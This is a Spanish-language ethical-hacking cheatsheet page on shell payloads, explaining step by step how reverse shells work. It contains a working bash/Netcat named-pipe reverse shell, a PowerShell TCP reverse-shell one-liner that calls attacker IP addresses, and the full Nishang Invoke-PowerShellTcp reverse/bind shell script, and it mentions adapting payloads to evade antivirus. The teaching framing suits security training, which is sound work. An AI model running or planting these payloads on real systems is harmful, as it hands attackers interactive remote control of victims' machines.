
# Payloads

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a ganar acceso a distintos sistemas, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Introducción a los Payloads</mark>

En seguridad de la información, un payload es el comando y/o código que explota una vulnerabilidad en un sistema operativo y/o aplicación. El payload es el comando y/o código que realiza la acción maliciosa desde una perspectiva defensiva. Como vimos en la sección de [Reverse Shells](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/shells-y-payloads/reverse-shells.md), Windows Defender detuvo la ejecución de nuestra carga útil de PowerShell porque se consideraba código malicioso.

Tenga en cuenta que cuando entregamos y ejecutamos cargas útiles, como cualquier otro programa, le damos a la computadora de destino instrucciones sobre lo que debe hacer. Los términos "malware" y "código malicioso" romantizan el proceso y lo hacen más misterioso de lo que es. Cada vez que trabajamos con cargas útiles, debemos explorar qué hacen realmente el código y los comandos. Comenzaremos este proceso desglosando los one-liners con las que trabajamos anteriormente:

***

## <mark style="color:purple;">One-Liners</mark>

### **Netcat/Bash Reverse Shell de una sola línea**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

Los comandos anteriores constituyen una frase común emitida en un sistema Linux para servir un shell Bash en un socket de red que utiliza un oyente Netcat. Usamos esto anteriormente en la sección [Bind Shells](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/shells-y-payloads/bind-shells.md). A menudo se copia y pega, pero no se entiende. Analicemos cada parte del resumen:

**Elminar /tmp/f**

```bash
rm -f /tmp/f; 
```

Elimina el archivo `/tmp/f` si existe, `-f` hace que se ignoren los archivos inexistentes. El punto y coma ( `;`) se utiliza para ejecutar el comando de forma secuencial.

#### **Hacer una tubería con nombre**

```bash
mkfifo /tmp/f; 
```

Crea un [archivo de canalización con nombre FIFO](https://man7.org/linux/man-pages/man7/fifo.7.html) en la ubicación especificada. En este caso, /tmp/f es el archivo de canalización con nombre FIFO, el punto y coma ( `;`) se utiliza para ejecutar el comando secuencialmente.

#### **Redirección de salida**

```bash
cat /tmp/f | 
```

Concatena el archivo de tubería FIFO llamado /tmp/f, la tubería ( `|`) conecta la salida estándar de cat /tmp/f a la entrada estándar del comando que viene después de la tubería ( `|`).

#### **Establecer opciones de shell**

```bash
/bin/bash -i 2>&1 | 
```

Especifica el intérprete del lenguaje de comandos utilizando la opción `-i` para garantizar que el shell sea interactivo. `2>&1`garantiza que el flujo de datos de error estándar ( `2`) `&`el flujo de datos de salida estándar ( `1`) se redirija al comando que sigue a la tubería ( `|`).

#### **Abrir una conexión con Netcat**

```bash
nc 10.10.14.12 7777 > /tmp/f  
```

Utiliza Netcat para enviar una conexión a nuestro host de ataque `10.10.14.12`escuchando en el puerto `7777`. La salida será redirigida ( `>`) a /tmp/f, entregando el shell Bash a nuestro oyente Netcat en espera cuando se ejecute el comando de una sola línea del shell inverso.

***

## <mark style="color:purple;">Explicación de One-Liner en PowerShell</mark>

Los shells y las cargas útiles que elegimos utilizar dependen en gran medida del sistema operativo que estemos atacando. Tenga esto en cuenta a medida que avanzamos a lo largo del módulo. Fuimos testigos de esto en la sección de shells inversos al establecer un shell inverso con un sistema Windows usando PowerShell. Analicemos la frase ingeniosa que utilizamos:

## **Powershell de una sola línea**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Analizaremos el comando de PowerShell bastante grande que puede ver arriba. Puede parecer mucho, pero con suerte podremos desmitificarlo un poco.

#### **Llamando a PowerShell**

```bash
powershell -nop -c 
```

Se ejecuta `powershell.exe` sin perfil ( `nop`) y ejecuta el bloque de comando/script ( `-c`) contenido entre comillas. Este comando en particular se emite dentro del símbolo del sistema, razón por la cual PowerShell está al principio del comando. Es bueno saber cómo hacer esto si descubrimos una vulnerabilidad de ejecución remota de código que nos permite ejecutar comandos directamente en `cmd.exe`.

#### **Vincular un Socket**

```bash
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
```

Establece/evalúa la variable `$client`igual a ( `=`) del `New-Object`cmdlet, lo que crea una instancia del `System.Net.Sockets.TCPClient`objeto .NET framework. El objeto .NET framework se conectará con el socket TCP que figura entre paréntesis `(10.10.14.158,443)`. El punto y coma ( `;`) garantiza que los comandos y el código se ejecuten secuencialmente.

#### **Configuración del flujo de comandos**

```bash
$stream = $client.GetStream();
```

Establece/evalúa la variable `$stream` igual a ( `=`) la variable `$client` y el método de .NET framework llamado [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) que facilita las comunicaciones de red. El punto y coma ( `;`) garantiza que los comandos y el código se ejecuten secuencialmente.

#### **Flujo de bytes vacío**

```bash
[byte[]]$bytes = 0..65535|%{0}; 
```

Crea una matriz de tipo byte ( `[]`) llamada `$bytes` que devuelve 65,535 ceros como valores en la matriz. Se trata esencialmente de un flujo de bytes vacío que se dirigirá al escucha TCP en un cuadro de ataque que espera una conexión.

#### **Parámetros de transmisión**

```bash
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```

Inicia un bucle  `while`que contiene la variable `$i` establecida igual a ( ) del método [Stream.Read](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0) ( ) `=`de .NET framework . Los parámetros: buffer ( ), offset ( ) y count ( ) se definen dentro de los paréntesis del método.`$stream.Read$bytes0$bytes.Length`

#### **Establecer la codificación de bytes**

```bash
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```

Establece/evalúa la variable `$data` igual a ( `=`) una clase de marco .NET de codificación [ASCII](https://en.wikipedia.org/wiki/ASCII) que se utilizará junto con el método  `GetString`para codificar el flujo de bytes ( `$bytes`) en ASCII. En resumen, lo que escribamos no sólo se transmitirá y recibirá como bits vacíos, sino que se codificará como texto ASCII. El punto y coma ( `;`) garantiza que los comandos y el código se ejecuten secuencialmente.

#### **Invoke-Expression**

```bash
$sendback = (iex $data 2>&1 | Out-String ); 
```

Establece/evalúa la variable `$sendback` igual a ( `=`) el cmdlet Invoke-Expression ( `iex`) contra la variable `$data`, luego redirige el error estándar ( `2>`) `&`salida estándar ( `1`) a través de una tubería ( `|`) al cmdlet `Out-String` que convierte los objetos de entrada en cadenas. Debido a que se utiliza Invoke-Expression, todo lo almacenado en $data se ejecutará en la computadora local. El punto y coma ( `;`) garantiza que los comandos y el código se ejecuten secuencialmente.

#### **Mostrar directorio de trabajo**

```bash
$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 
```

Establece/evalúa la variable `$sendback2` igual a ( `=`) la variable `$sendback` más ( `+`) la cadena PS ( `'PS'`) más `+`la ruta al directorio de trabajo ( `(pwd).path`) más ( `+`) la cadena `'> '`. Esto dará como resultado que el símbolo del shell sea `PS C:\workingdirectoryofmachine >`. El punto y coma ( `;`) garantiza que los comandos y el código se ejecuten secuencialmente. Recuerde que el operador + en programación combina cadenas cuando no se utilizan valores numéricos, con la excepción de ciertos lenguajes como C y C++ donde se necesitaría una función.

#### **Establece el byte de envío**

```bash
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```

Establece/evalúa la variable `$sendbyte` igual a ( `=`) el flujo de bytes codificado en ASCII que utilizará un cliente TCP para iniciar una sesión de PowerShell con un oyente Netcat ejecutándose en el cuadro de ataque.

#### **Terminar la conexión TCP**

```bash
$client.Close()"
```

Este es el método [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0) que se utilizará cuando finalice la conexión.

El resumen que acabamos de examinar juntos también se puede ejecutar en forma de script de PowerShell ( `.ps1`). Podemos ver un ejemplo de esto viendo el código fuente a continuación. Este código fuente es parte del proyecto [nishang :](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

Código: powershell

```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind
    )
    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
```

***

## <mark style="color:purple;">Los Payloads toman diferentes formas</mark>

Comprender qué hacen los diferentes tipos de cargas útiles puede ayudarnos a comprender por qué AV nos bloquea la ejecución y darnos una idea de lo que podríamos necesitar cambiar en nuestro código para evitar las restricciones. Esto es algo que exploraremos más a fondo en este módulo. Por ahora, comprenda que las cargas útiles que utilizamos para obtener un shell en un sistema estarán determinadas en gran medida por el sistema operativo, los lenguajes de interpretación del shell e incluso los lenguajes de programación que estén presentes en el objetivo.

No todas las cargas útiles son de una sola línea y se implementan manualmente como las que estudiamos en esta sección. Algunos se generan utilizando marcos de ataque automatizados y se implementan como un ataque preempaquetado/automatizado para obtener un shell. Como en el poderoso [`Metasploit-framework`](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/metasploit.md), con el que trabajaremos en la siguiente sección.
